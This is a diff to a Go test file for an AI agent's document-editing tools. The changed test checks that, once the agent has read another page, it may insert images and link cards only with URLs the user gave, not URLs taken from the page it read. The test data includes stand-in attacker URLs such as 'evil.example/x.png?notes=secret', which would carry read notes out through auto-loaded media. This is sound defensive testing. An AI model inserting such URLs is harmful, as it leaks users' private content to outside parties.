@@ -353,12 +353,15 @@ func TestReplaceNestedItemsWithTable(t *testing.T) {
 }
 
 // Once a run has read another page, the images, videos and link cards it
-// writes load only URLs it saw, on this page or the pages it read: the
-// app loads them by itself, so any other could carry what it read away.
+// writes load only URLs the user gave it, on this page or in their
+// request: the app loads them by itself, so any other could carry what it
+// read away. One on the page it read is not the user's to give: someone
+// else may have put it there.
 func TestURLsAfterReadingAnotherPage(t *testing.T) {
 	c := page()
 	c.Children = append(c.Children, &doc.Node{ID: "i1", Type: "image", Data: map[string]any{"url": "https://example.com/here.png"}})
 	x := executor(c)
+	x.Ctx.Request = "Add the chart at https://example.com/asked.png to the end"
 	x.Ctx.ReadOtherPage = func(id string) map[string]any {
 		return map[string]any{"page": map[string]any{"id": id}, "blocks": []map[string]any{{"id": "b", "type": "paragraph", "text": "See [the spec](https://example.com/spec)."}}}
 	}
@@ -375,7 +378,7 @@ func TestURLsAfterReadingAnotherPage(t *testing.T) {
 	if out := x.Call("read_other_page", map[string]any{"page_id": "other"}); out["error"] != nil {
 		t.Fatal(out)
 	}
-	for _, args := range []map[string]any{image("https://evil.example/x.png?notes=secret"), card("https://evil.example/?notes=secret")} {
+	for _, args := range []map[string]any{image("https://evil.example/x.png?notes=secret"), card("https://evil.example/?notes=secret"), card("https://example.com/spec")} {
 		if out := x.Call("insert_blocks", args); out["error"] == nil {
 			t.Errorf("inserted %v after reading another page", args)
 		}
@@ -383,9 +386,9 @@ func TestURLsAfterReadingAnotherPage(t *testing.T) {
 	if out := x.Call("replace_block", map[string]any{"id": "p1", "block": map[string]any{"type": "image", "image": map[string]any{"url": "https://evil.example/y.png"}}}); out["error"] == nil {
 		t.Error("replaced a block with an image of a new URL")
 	}
-	for _, args := range []map[string]any{image("https://example.com/here.png"), card("https://example.com/spec")} {
+	for _, args := range []map[string]any{image("https://example.com/here.png"), image("https://example.com/asked.png")} {
 		if out := x.Call("insert_blocks", args); out["error"] != nil {
-			t.Errorf("a URL it saw: %v", out)
+			t.Errorf("a URL the user gave: %v", out)
 		}
 	}
 	// What the run wrote is not what it found, though it is on the page.
